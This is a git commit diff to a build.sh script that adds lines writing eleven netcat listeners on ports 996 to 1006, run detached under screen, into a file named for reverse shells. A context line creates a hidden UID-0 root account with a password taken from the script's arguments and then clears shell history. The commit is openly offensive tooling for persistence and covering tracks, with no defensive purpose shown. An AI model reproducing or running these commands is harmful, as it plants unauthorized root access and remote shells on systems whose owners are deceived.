7cca95de16a48a3e1ec09d70d380c7eb4c0b78e5
PrestigeDox <themutantreaper@gmail.com>
2017-08-08 12:39:01 +0100

    update build.sh
    Premature work on the reverse NC and Bash shells.

--- build.sh
+++ build.sh
@@ -7,4 +7,16 @@ rm -rf main.c
 echo $1 >> details.txt
 echo $2 >> details.txt
 
+echo screen -d -m bash -c "nc -l 996" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 997" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 998" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 999" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1000" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1001" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1002" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1003" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1004" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1005" >> openreverseshell.sh
+echo screen -d -m bash -c "nc -l 1006" >> openreverseshell.sh
+
 echo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash $1; echo -e $2"\n"$2 | passwd $1; history -c; >> root.sh
